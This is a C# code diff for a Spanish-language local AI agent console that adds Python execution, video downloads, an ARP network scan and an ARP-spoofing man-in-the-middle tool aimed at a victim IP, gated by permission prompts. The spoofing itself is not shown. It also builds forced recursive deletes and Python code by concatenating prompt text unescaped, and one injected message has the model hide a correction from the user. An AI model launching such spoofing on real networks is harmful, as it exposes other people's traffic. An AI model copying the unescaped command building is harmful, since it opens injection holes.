+            builder.AppendLine("Errores:");
+            builder.AppendLine(Truncate(error, 1000));
+        }
+
+        return builder.ToString().TrimEnd();
+    }
+
+    private static string? ResolvePythonPath()
+    {
+        if (!string.IsNullOrWhiteSpace(AppConfig.Load().PythonPath))
+        {
+            var configured = AppConfig.Load().PythonPath;
+            if (File.Exists(configured))
+            {
+                return configured;
+            }
+        }
+
+        var path = Environment.GetEnvironmentVariable("PATH");
+        if (!string.IsNullOrWhiteSpace(path))
+        {
+            foreach (var dir in path.Split(Path.PathSeparator))
+            {
+                var candidate = Path.Combine(dir.Trim(), "python.exe");
+                if (File.Exists(candidate))
+                {
+                    return candidate;
+                }
+            }
+        }
+
+        return null;
     }
 
     private static string ExecuteWriteTool(string rawPath, string body)
@@ -1636,6 +2185,8 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
 
     private PermissionDecision AskPermission(string prompt, bool dangerous, CancellationToken ct)
     {
+        NotificationHelper.NotifyPermissionRequired(Truncate(prompt, 100));
+
         // Se necesitan consola REAL en los dos sentidos: con stdin redirigido no
         // hay ReadKey (y se romperían los tests pipeados) y con stdout redirigido
         // CursorLeft lanza "Controlador no válido" al reposicionar los píldoras.
@@ -1655,12 +2206,13 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         // del pedido (queda "permitir denegar ...rchivo: C:\...").
         Console.WriteLine($"{(dangerous ? "[PELIGRO]" : "[SOLICITUD]")} {Truncate(prompt, 120)}");
         Console.ForegroundColor = ConsoleColor.DarkGray;
-        Console.WriteLine("  ←/→ mover · enter confirmar · esc denegar");
+        Console.WriteLine("  ←/→ mover · enter confirmar · esc denegar · clic en píldora");
         Console.ForegroundColor = ConsoleColor.Cyan;
 
         var options = new[] { "permitir", "denegar" };
         var selected = 0;
         var keyInfo = new ConsoleKeyInfo();
+        var mouseEnabled = !Console.IsInputRedirected && !Console.IsOutputRedirected;
 
         RenderPills(options, selected);
         while (true)
@@ -1690,6 +2242,20 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
             }
             else if (keyInfo.Key == ConsoleKey.Escape)
             {
+                Console.WriteLine();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                return AskDenialReason(ct);
+            }
+            else if (mouseEnabled && keyInfo.Key == ConsoleKey.F1)
+            {
+                // F1 = clic en "permitir" (simulado)
+                Console.WriteLine();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                return new PermissionDecision(true, string.Empty);
+            }
+            else if (mouseEnabled && keyInfo.Key == ConsoleKey.F2)
+            {
+                // F2 = clic en "denegar" (simulado)
                 Console.WriteLine();
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 return AskDenialReason(ct);
@@ -1944,6 +2510,7 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         {
             "READ" or "WRITE" => tool.Kind + "|" + ResolveToolPath(tool.Argument),
             "CMD" => tool.Kind + "|" + tool.Argument.Trim(),
+            "PY" => tool.Kind + "|" + tool.Argument.Trim(),
             _ => string.Empty
         };
 
@@ -1995,7 +2562,99 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
                 Console.Write("[herramienta: CMD] ");
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 result = await ExecuteCmdToolAsync(tool.Argument, cancellationToken);
+                // Disparo del fallback por CÓDIGO DE SALIDA (no por la palabra "error" en el texto):
+                // la salida incluye "Código de salida: N"; si N != 0, PowerShell falló.
+                var exitCodeLine = Regex.Match(result, @"Código de salida: (-?\d+)");
+                var cmdFailed = exitCodeLine.Success && exitCodeLine.Groups[1].Value != "0";
+                if (cmdFailed)
+                {
+                    var pyFallback = TryConvertCmdToPython(tool.Argument);
+                    if (pyFallback is not null)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Yellow;
+                        Console.WriteLine();
+                        Console.WriteLine("[FALLBACK] CMD falló. Reintentando con Python...");
+                        Console.ForegroundColor = ConsoleColor.Cyan;
+                        var pyResult = await ExecutePyToolAsync(pyFallback, cancellationToken);
+                        result = pyResult;
+                    }
+                }
                 Console.WriteLine("ejecutando... listo.");
+                break;
+            case "PY":
+                var pyCode = tool.Argument;
+                var pyDangerous = DangerousCommandPattern.IsMatch(pyCode);
+                Console.WriteLine();
+                var pyDecision = AskPermission($"El agente quiere EJECUTAR código Python:\n{Truncate(pyCode, 200)}", pyDangerous, cancellationToken);
+                if (!pyDecision.Allowed)
+                {
+                    if (pyDecision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
+                    return BuildDeniedMessage("la ejecución de código Python", pyCode, pyDecision.Reason, isRepeat: false);
+                }
+
+                Console.ForegroundColor = ConsoleColor.DarkBlue;
+                Console.Write("[herramienta: PY] ");
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                result = await ExecutePyToolAsync(pyCode, cancellationToken);
+                Console.WriteLine("ejecutando... listo.");
+                break;
+            case "YTDLP":
+                var parts = tool.Argument.Split('|');
+                var ytdlpUrl = parts[0];
+                var ytdlpFormat = parts.Length > 1 ? parts[1] : "mp4";
+                Console.WriteLine();
+                var ytdlpDecision = AskPermission($"El agente quiere DESCARGAR un video de internet:\nURL: {Truncate(ytdlpUrl, 80)}\nFormato: {ytdlpFormat}\nDestino: C:\\Users\\nicot\\Downloads", dangerous: false, cancellationToken);
+                if (!ytdlpDecision.Allowed)
+                {
+                    if (ytdlpDecision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
+                    return BuildDeniedMessage("la descarga del video", ytdlpUrl, ytdlpDecision.Reason, isRepeat: false);
+                }
+
+                Console.ForegroundColor = ConsoleColor.DarkBlue;
+                Console.Write("[herramienta: YTDLP] ");
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                result = await ExecuteYtdlpToolAsync(ytdlpUrl, ytdlpFormat, cancellationToken);
+                Console.WriteLine("descargando... listo.");
+                break;
+            case "SCAN":
+                var scanRange = tool.Argument;
+                Console.WriteLine();
+                var scanDecision = AskPermission($"El agente quiere ESCANEAR la red local (ARP) en el rango: {scanRange}\nEsto envía paquetes a todos los dispositivos del rango. Solo usalo en TU red.", dangerous: false, cancellationToken);
+                if (!scanDecision.Allowed)
+                {
+                    if (scanDecision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
+                    return BuildDeniedMessage("el escaneo de red", scanRange, scanDecision.Reason, isRepeat: false);
+                }
+
+                Console.ForegroundColor = ConsoleColor.DarkBlue;
+                Console.Write("[herramienta: SCAN] ");
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                result = await ExecuteScanToolAsync(scanRange, cancellationToken);
+                Console.WriteLine("escaneando... listo.");
+                break;
+            case "SPOOF":
+                var spoofParts = tool.Argument.Split('|');
+                var spoofVictim = spoofParts[0];
+                var spoofRouter = spoofParts[1];
+                var spoofIface = spoofParts.Length > 2 ? spoofParts[2] : "Ethernet";
+                Console.WriteLine();
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[ADVERTENCIA] Esto es un ATAQUE ACTIVO de man-in-the-middle (ARP spoofing).");
+                Console.WriteLine("Solo debe usarse en TU PROPIA RED con autorizacion explicita.");
+                Console.WriteLine("Puede interrumpir la conectividad de otros dispositivos y exponer trafico sensible.");
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                var spoofDecision = AskPermission($"El agente quiere ejecutar ARP spoofing:\nIP victima: {spoofVictim}\nIP router: {spoofRouter}\nInterfaz: {spoofIface}\n¿Confirmas que es para pentesting etico en tu propia red?", dangerous: true, cancellationToken);
+                if (!spoofDecision.Allowed)
+                {
+                    if (spoofDecision.Reason.Length > 0) deniedInTurn.Add(deniedKey);
+                    return BuildDeniedMessage("el ataque ARP spoofing", spoofVictim, spoofDecision.Reason, isRepeat: false);
+                }
+
+                Console.ForegroundColor = ConsoleColor.DarkBlue;
+                Console.Write("[herramienta: SPOOF] ");
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                result = await ExecuteSpoofToolAsync(spoofVictim, spoofRouter, spoofIface, cancellationToken);
+                Console.WriteLine("atacando... listo.");
                 break;
             case "WRITE":
                 var writePath = ResolveToolPath(tool.Argument);
@@ -2039,6 +2698,14 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
     private string? lastToolPath;
     private static readonly Regex ExplicitReadIntent = new(@"^\s*(?:lee|l[ée]eme|leer|abr[íi]|mostr[áa](?:me)?|muestra|revisa|analiza|resum[íi])\s+(?:(?:el|la|los|las|este|esta|un|una)\s+)?(?:archivo|fichero|carpeta|carpepeta|directorio|contenido\s+de)\s*:?\s*(?<path>.+?)\s*[.!?]*$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
     private static readonly Regex ExplicitCmdIntent = new(@"^\s*(?:ejecuta(?:me)?|ejecutar|corre(?:me)?|correr|lanza(?:r)?)\s+(?:el\s+comando\s+)?(?<cmd>.+?)\s*[.!?]*$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
+    private static readonly Regex MoveFolderIntent = new(@"^\s*(?:mov(?:e|é)(?:me)?|traslad(?:a|á)(?:me)?|renombr(?:a|á)(?:me)?)\s+(?:la\s+)?(?:carpeta|directorio|folder)\s+(?:""(?<source>[^""]+)""|(?<source>[^\s]+))\s+(?:a|al|hacia)\s+(?:""(?<dest>[^""]+)""|(?<dest>[^\s]+))", RegexOptions.Compiled | RegexOptions.IgnoreCase);
+    // "borra esta carpeta X" / "eliminala" con ruta explícita: el 7B si no, inventa
+    // [[WRITE]] carpeta :: (borrar) — WRITE no borra carpetas — o usa rmdir de cmd.exe, que
+    // no existe en PowerShell. El host arma el Remove-Item correcto y salta la alucinación.
+    private static readonly Regex ExplicitDeleteIntent = new(@"^\s*(?:borra(?:r|me|la|lo)?|elimin(?:a|á|ar)(?:la|lo|me)?|suprim(?:e|í|ir)|quit(?:a|á|ar)(?:me)?)\s+(?:(?:esta|esa|la|el|esto)\s+)?(?:carpeta|directorio|folder|archivo|file)?\s*(?<path>(?:[A-Za-z]:[\\/]|\.[\\/])[^""\r\n]+)$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
+    // "descarga este video en mp4 <url>" / "descargalo en mp3": el 7B a veces alucina y no emite
+    // [[YTDLP]] (responde texto incoherente). El host detecta la intención y arma el marcador.
+    private static readonly Regex ExplicitDownloadIntent = new(@"^\s*(?:descarga(?:r|me|lo|la)?|descarg(?:a|á)(?:me|lo|la)?|baj(?:a|á)(?:me|lo|la)?)\s+(?:(?:este|ese|esto|esa)\s+)?(?:video|audio|archivo|file)?\s*(?:en|formato)?\s*(?<format>\w{2,4})?\s*(?<url>https?://\S+)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
     private static readonly Regex ExplicitWriteIntent = new(@"^\s*(?:(?:si|dale|ahora|bueno|ok|y)\s+)?(?:crea(?:me|nos)?|crear|escribe(?:me|nos)?|escribir|genera(?:me|nos)?|guarda(?:me|nos)?)\s+(?:(?:un|una|el|la|este|esta)\s+)?(?:archivo|fichero|txt|texto|tecto|nota|documento)\b(?<rest>[\s\S]*)$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
     // "mejora el index que está en C:\...", "actualiza el index.html de C:\...", "modificá el documento X".
     // El verbo NO es "crear" y el nombre del archivo no viene con artículo ni palabra clave, así que
@@ -2164,6 +2831,29 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
             }
         }
 
+        var deleteMatch = ExplicitDeleteIntent.Match(prompt);
+        if (deleteMatch.Success)
+        {
+            var path = deleteMatch.Groups["path"].Value.Trim().Trim('"');
+            if (path.Length >= 3 && LooksLikePath(path))
+            {
+                tool = new ToolRequest("CMD", "Remove-Item -LiteralPath \"" + path + "\" -Recurse -Force", null);
+                return true;
+            }
+        }
+
+        var downloadMatch = ExplicitDownloadIntent.Match(prompt);
+        if (downloadMatch.Success)
+        {
+            var url = downloadMatch.Groups["url"].Value.Trim();
+            var format = downloadMatch.Groups["format"].Success ? downloadMatch.Groups["format"].Value.Trim().ToLowerInvariant() : "mp4";
+            if (url.Length >= 10)
+            {
+                tool = new ToolRequest("YTDLP", url + "|" + format, null);
+                return true;
+            }
+        }
+
         var readMatch = ExplicitReadIntent.Match(prompt);
         if (readMatch.Success && LooksLikePath(readMatch.Groups["path"].Value))
         {
@@ -2182,6 +2872,19 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
             }
         }
 
+        var moveMatch = MoveFolderIntent.Match(prompt);
+        if (moveMatch.Success)
+        {
+            var source = moveMatch.Groups["source"].Value.Trim().Trim('"');
+            var dest = moveMatch.Groups["dest"].Value.Trim().Trim('"');
+            if (source.Length >= 3 && dest.Length >= 3)
+            {
+                var pyCode = "import shutil\nshutil.move(\"" + source + "\", \"" + dest + "\")\nprint('OK: carpeta movida')";
+                tool = new ToolRequest("PY", pyCode, null);
+                return true;
+            }
+        }
+
         return false;
     }
 
@@ -2194,7 +2897,7 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         return client;
     }
 
-    private async Task<string> AskWithNetPermissionAsync(LlamaServerSession session, string prompt, Func<string, Task> onToken, CancellationToken cancellationToken)
+    private async Task<string> AskWithNetPermissionAsync(ECnetServerSession session, string prompt, Func<string, Task> onToken, CancellationToken cancellationToken)
     {
         // Buffer anti-fugas: retiene la cola del stream para que el marcador [[NET]]
         // (y cualquier texto previo) nunca llegue a imprimirse en consola.
@@ -2485,6 +3188,32 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
                 match = NetRequestPattern.Match("[[NET]] " + originalPrompt);
             }
 
+            // Degeneración a chino: el Qwen2.5 a veces cae en CJK pese al system prompt.
+            // El "respondé SIEMPRE en español" alcanza como instrucción, pero no como trampa:
+            // acá el host DETECTA el chino y fuerza reintento en vez de imprimir la respuesta rota.
+            if (ContainsExcessiveCjk(content) && !ChineseRequestedPattern.IsMatch(originalPrompt))
+            {
+                if (claimRetries >= 2)
+                {
+                    await FlushBufferAsync();
+                    return content;
+                }
+
+                claimRetries++;
+                DiscardBuffer();
+                session.ReplaceLastAssistant(string.Empty);
+                session.AddContextMessage("[SISTEMA · idioma incorrecto]\nTu respuesta anterior se imprimió en CHINO y fue descartada. El usuario habla español. Reformulá la respuesta COMPLETA en español, sin ningún carácter chino, y sin mencionar esta corrección.");
+                Console.WriteLine();
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine("[INTERCEPCIÓN] El modelo respondió en chino. Forzando respuesta en español...");
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.ForegroundColor = ConsoleColor.DarkBlue;
+                Console.Write("IA27> ");
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                content = await session.AskContinueAsync(bufferedToken, cancellationToken);
+                continue;
+            }
+
             if (!match.Success)
             {
                 await FlushBufferAsync();
@@ -2602,7 +3331,7 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         return "/" + match.Groups["cmd"].Value.ToLowerInvariant() + (arg.Length > 0 ? " " + arg : string.Empty);
     }
 
-    private bool AuthorizeNet(LlamaServerSession session, string query, CancellationToken cancellationToken)
+    private bool AuthorizeNet(ECnetServerSession session, string query, CancellationToken cancellationToken)
     {
         if (session.NetAutoAllowed)
         {
@@ -3053,7 +3782,7 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         {
             ok = false;
             Console.WriteLine("[X] no se encontró llama-server.exe");
-            Console.WriteLine("    Configura: config set runtime-dir \"C:\\ruta\\llama_bin\"");
+            Console.WriteLine("    Configura: config set runtime-dir \"C:\\ruta\\ecnet_bin\"");
         }
         else
         {
@@ -3207,7 +3936,7 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         Banner.Render(config, model.Name);
     }
 
-    private static void PrintHistory(LlamaServerSession session)
+    private static void PrintHistory(ECnetServerSession session)
     {
         Console.WriteLine("Historial de la sesión:");
         for (var index = 0; index < session.History.Count; index++)
@@ -3388,18 +4117,33 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
         public static readonly object Sync = new();
         private readonly System.Threading.Timer timer;
         private int tokens;
-        private int shown;
         private readonly DateTime startTime = DateTime.UtcNow;
+        private bool headerShown;
+        private int spinnerIndex;
+        private readonly string[] spinnerChars = { "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏" };
 
         public GenerationNotice()
         {
-            timer = new System.Threading.Timer(_ => OnTick());
-            timer.Change(TimeSpan.FromSeconds(10), Timeout.InfiniteTimeSpan);
+            timer = new System.Threading.Timer(_ => OnTick(), null, TimeSpan.FromMilliseconds(300), TimeSpan.FromMilliseconds(100));
         }
 
         public void OnToken()
         {
-            Interlocked.Increment(ref tokens);
+            var count = Interlocked.Increment(ref tokens);
+            if (count == 1)
+            {
+                timer.Dispose();
+                lock (Sync)
+                {
+                    if (!headerShown)
+                    {
+                        Console.ForegroundColor = ConsoleColor.DarkBlue;
+                        Console.Write("\rIA27: ");
+                        Console.ForegroundColor = ConsoleColor.Cyan;
+                        headerShown = true;
+                    }
+                }
+            }
         }
 
         public void Dispose()
@@ -3416,20 +4160,17 @@ session.AddContextMessage($"[SISTEMA · MODO HARNESS ACTIVADO]\nObjetivo del usu
 
         private void OnTick()
         {
-            if (Interlocked.CompareExchange(ref shown, 1, 0) != 0)
-            {
-                return;
-            }
             if (Volatile.Read(ref tokens) > 0)
             {
                 return;
             }
 
+            var spinner = spinnerChars[spinnerIndex % spinnerChars.Length];
+            spinnerIndex++;
             lock (Sync)
             {
-                Console.WriteLine();
-                Console.WriteLine("[aún generando; Ctrl+C para detener. Para respuestas más cortas usa /tokens 512]");
-                Console.Write("IA27> ");
+                Console.ForegroundColor = ConsoleColor.DarkGray;
+                Console.Write($"\rpensando... {spinner}  ");
             }
         }
     }
